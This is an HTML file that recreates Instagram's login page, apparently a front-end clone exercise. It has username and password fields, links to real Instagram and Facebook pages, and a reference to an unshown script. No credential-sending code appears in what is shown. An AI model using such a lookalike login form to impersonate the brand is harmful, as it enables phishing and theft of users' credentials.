<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="instaclone48.css">
</head>

<body>
    <div class="login-container">
        <div class="login-box">
            <img src="https://see.fontimg.com/api/rf5/El3e/NGQ2MTljMTk2NDNhNDg0NmI5Mzk4Mzk4ODM3OGE3ZmUudHRm/VmFybWFJc3Rh/android-101.png?r=fs&h=49&w=1250&fg=000000&bg=FFFFFF&tb=1&s=39" alt="Instagram"
                class="logo">
            <form>
                <input type="text" placeholder="Phone number, username, or email" class="input-field" required>
                <input type="password" placeholder="Password" class="input-field" required>
                <button type="submit" class="login-btn">Log in</button>
                <div class="separator">OR</div>
                <div class="facebook-redirect">
                    <a href="https://www.facebook.com/login/" target="_blank" class="fb-login-btn">
                        <img src="https://www.svgrepo.com/show/475647/facebook-color.svg" class="fb-icon"> Log in with
                        FACEBOOK
                    </a>
                </div>
                <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot-password">Forgot
                    password?</a>
            </form>
        </div>
        <div class="signup-box">
            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a></p>
        </div>
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-buttons">
                <a href="https://play.google.com/store/games?hl=en" target="_blank">
                    <img src="https://www.svgrepo.com/show/353828/google-play-icon.svg" alt="Get it on Google Play">
                </a>
                <a href="https://account.microsoft.com/account" target="_blank">
                    <img src="https://www.svgrepo.com/show/132023/microsoft.svg" alt="Get it from Microsoft">
                </a>
            </div>
        </div>
    </div>
    <!-- Script placed here -->

    <script src="instaclone48.js.js"></script>

</body>

</html>
